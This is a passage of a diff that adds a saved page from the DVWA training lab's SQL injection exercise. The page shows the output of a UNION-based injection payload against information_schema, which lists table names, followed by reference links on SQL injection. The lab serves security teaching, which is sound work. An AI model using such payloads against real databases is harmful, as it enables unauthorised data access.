</pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: users_usergroups<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: users_users<br>Surname: </pre>
+
+
+
+	</div>
+
+
+
+	<h2>More info</h2>
+
+	<ul>
+
+		<li><a href="http://hiderefer.com/?http://www.securiteam.com/securityreviews/5DP0N1P76E.html" target="_blank">http://www.securiteam.com/securityreviews/5DP0N1P76E.html</a></li>
+
+		<li><a href="http://hiderefer.com/?http://en.wikipedia.org/wiki/SQL_injection" target="_blank">http://en.wikipedia.org/wiki/SQL_injection</a></li>
+
+		<li><a href="http://hiderefer.com/?http://www.unixwiz.net/techtips/sql-injection.html" target="_blank">http://www.unixwiz.net/techtips/sql-injection.html</a></li>
+
+	</ul>
+
+</div>
+
+
+
+				<br />
+
+				<br />
+
+				
+
+
+
+			</div>
+
+
+
+			<div class="clear">
+
+			</div>
+
+
+
+			<div id="system_info">
+
+				<input type="button" value="View Help" class="popup_button" onClick="javascript:popUp( '../../vulnerabilities/view_help.php?id=sqli&security=low' )"> <input type="button" value="View Source" class="popup_button" onClick="javascript:popUp( '../../vulnerabilities/view_source.php?id=sqli&security=low' )"> <div align="left"><b>Username:</b> admin<br /><b>Security Level:</b> low<br /><b>PHPIDS:</b> disabled</div>
+
+			</div>
+
+
+
+			<div id="footer">
+
+
+
+				<p>Damn Vulnerable Web Application (DVWA) v1.0.7</p>
+
+
+
+			</div>
+
+
+
+		</div>
+
+
+
+	</body>
+
+
+
+</html>
